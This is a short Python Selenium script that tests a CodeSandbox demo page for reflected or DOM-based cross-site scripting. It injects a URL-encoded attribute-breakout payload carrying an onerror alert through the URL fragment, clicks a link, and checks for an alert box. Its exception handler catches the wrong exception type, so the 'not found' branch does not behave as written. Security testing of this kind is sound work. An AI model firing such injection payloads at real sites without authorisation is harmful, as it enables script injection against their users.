# Testing reflected/DOM-based cross site scripting
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait as wait

url_endencoded_payload = "qwe%22%20onerror=alert('XSS')//"

def test_reflected_xss():
    url = "https://iedok.csb.app/#{}".format(url_endencoded_payload)
    driver = webdriver.Firefox()
    driver.get(url)
    # Click on url
    driver.find_element(By.XPATH, "//p[5]/a").click()
    # Wait for the XSS payload to execute
    try:
        alert = WebDriverWait(driver, 3).until(EC.alert_is_present())
        alert.accept()
        print("XSS vulnerability found!")
    except TimeoutError:
        print("No XSS vulnerability found.")
    driver.quit()

test_reflected_xss()
